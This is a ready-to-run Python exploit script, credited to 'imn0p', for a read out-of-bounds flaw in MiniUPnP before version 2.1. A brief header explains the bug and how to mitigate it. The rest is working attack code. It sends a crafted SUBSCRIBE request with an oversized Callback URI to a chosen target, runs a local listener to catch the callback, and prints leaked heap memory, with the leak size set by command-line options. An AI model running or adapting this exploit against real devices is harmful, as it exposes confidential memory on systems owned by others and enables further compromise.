#!/usr/bin/python3
# MiniUPnP < 2.1 Read Out-of-Bounds Vulnerability
# 
# Description:
# A vulnerability in MiniUPnP versions < 2.1 allows attackers to exploit
# improper handling of event subscription requests. This can lead to
# reading memory beyond allocated buffers, potentially leaking sensitive data.
#
# Key Points:
# 1. **Context**: MiniUPnP is used for automatic network configuration.
# 2. **Cause**: Lack of proper validation for callback lengths in subscriptions.
# 3. **Exploitation**: Attackers can send crafted requests to read arbitrary
#    memory, revealing confidential information.
# 4. **Consequences**: Sensitive data exposure can lead to further system
#    compromise.
#
# Mitigation:
# - **Update**: Upgrade to MiniUPnP version >= 2.1 to fix the issue.
# - **Secure Configuration**: Limit UPnP access to trusted networks and disable
#   it if not needed.

banner = """

            _       _
  _ __ ___ (_)_ __ (_)_   _ _ __  _ __  _ __
 | '_ ` _ \| | '_ \| | | | | '_ \| '_ \| '_ \\
 | | | | | | | | | | | |_| | |_) | | | | |_) |
 |_| |_| |_|_|_| |_|_|\__,_| .__/|_| |_| .__/
                           |_|         |_|
                  _       _ _
   _____  ___ __ | | ___ (_) |_
  / _ \ \/ / '_ \| |/ _ \| | __|
 |  __/>  <| |_) | | (_) | | |_
  \___/_/\_\ .__/|_|\___/|_|\__|
           |_|

                         by imn0p

    """

import requests
import socketserver
import argparse
import sys

class HTTPResponseHandler(socketserver.StreamRequestHandler):
    def handle(self):
        self.request.settimeout(self.server.timeout)
        self.server.received_data = b""
        try:
            byte = self.rfile.read(1)
            while len(byte) > 0:
                self.server.received_data += byte
                byte = self.rfile.read(1)
        except Exception as e:
            print(f"Error: {e}")
        self.wfile.write(b"HTTP/1.1 200 OK\r\n\r\n")

class MiniUPnPExploit:
    

    def __init__(self, target_ip, target_port, callback_ip, callback_port, timeout, data_leak_size):
        self.target_ip = target_ip
        self.target_port = target_port
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.timeout = timeout
        self.data_leak_size = data_leak_size

    def perform_data_leak(self):
        total_leak_size = ((1024 * self.data_leak_size) + 526)
        callback_uri = "A" * total_leak_size
        headers = {
            'NT': 'upnp:event',
            'Callback': f'<http://{self.callback_ip}:{self.callback_port}/{callback_uri}>',
            'Timeout': 'Second-20'
        }
        
        server = socketserver.TCPServer((self.callback_ip, self.callback_port), HTTPResponseHandler)
        server.timeout = self.timeout
        print("[+] Sending request...")
        requests.request(method="SUBSCRIBE", url=f"http://{self.target_ip}:{self.target_port}/evt/L3F", headers=headers, timeout=self.timeout)
        server.handle_request()
        leaked_data = server.received_data[1023:]  # Skip over the first 1024 bytes
        print(f"[+] Leaked Data: {leaked_data}")
        print(f"[+] Leaked Length: {len(leaked_data)}")
        print("[+] Done")


def main():
    parser = argparse.ArgumentParser(add_help=True, description='MiniUPnP < 2.1 Read Out-of-Bounds Vulnerability', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u', '--target_ip', required=True, help='IP address of vulnerable device.')
    parser.add_argument('-p', '--target_port', default=5000, help="Target Port.", type=int)
    parser.add_argument('--callback_ip', required=True, help="Local IP address for HTTP listener.", type=str)
    parser.add_argument('--callback_port', required=True, help="Local port for HTTP listener.", type=int)
    parser.add_argument('--timeout', default=5, help="Timeout for HTTP requests (in seconds).", type=float)
    parser.add_argument('--leak_amount', default=1, help="Amount of arbitrary heap data to leak (in KB).", type=int)
    args = parser.parse_args()

    exploit = MiniUPnPExploit(args.target_ip, args.target_port, args.callback_ip, args.callback_port, args.timeout, args.leak_amount)
    exploit.perform_data_leak()

if __name__ == '__main__':
    print(banner)
    try:
        main()
    except Exception as e:
        print("[-] Something has failed...\n\n")
        print(e)
        exit(1)

